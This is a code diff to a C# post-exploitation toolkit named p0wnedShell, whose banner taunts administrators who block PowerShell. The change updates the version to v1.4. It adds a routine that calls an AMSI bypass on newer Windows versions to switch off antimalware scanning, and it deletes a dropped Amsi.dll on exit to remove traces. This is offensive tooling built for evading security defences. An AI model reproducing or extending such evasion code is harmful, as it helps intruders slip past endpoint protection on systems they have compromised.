@@ -10,7 +10,7 @@
 * PowerShell Runspace Post Exploitation Toolkit                     *
 * For Bitch Ass Admins that tried to block our PowerShell candy ;)  *
 *                                                                   *
-*                                                              v1.3 *
+*                                                              v1.4 *
 \*******************************************************************/
 
 /*
@@ -94,7 +94,7 @@ namespace p0wnedShell
                     Console.WriteLine(item);
                 }
             }
-            Console.WriteLine(@"*                                                              v1.3 *");
+            Console.WriteLine(@"*                                                              v1.4 *");
             Console.WriteLine(@"*********************************************************************");
             Console.ResetColor();
             Console.WriteLine();
@@ -243,6 +243,13 @@ namespace p0wnedShell
             Console.Title = "p0wnedShell - PowerShell Runspace Post Exploitation Toolkit";
             Console.SetWindowSize(Math.Min(120, Console.LargestWindowWidth), Math.Min(65, Console.LargestWindowHeight));
             string Arch = System.Environment.GetEnvironmentVariable("PROCESSOR_ARCHITECTURE");
+            string LatestOSVersion = "6.3";
+            decimal latestOSVersionDec = decimal.Parse(LatestOSVersion, CultureInfo.InvariantCulture);
+            if (Pshell.EnvironmentHelper.RtlGetVersion() > latestOSVersionDec)
+            {
+                AmsiBypass.Amsi(Arch);
+            }
+
             int userInput = 0;
 
             do
@@ -386,6 +393,11 @@ namespace p0wnedShell
                 }
 
             } while (userInput != 18);
+
+            if (File.Exists(Program.P0wnedPath() + "\\Amsi.dll"))
+            {
+                File.Delete(Program.P0wnedPath() + "\\Amsi.dll");
+            }
         }
     }
 
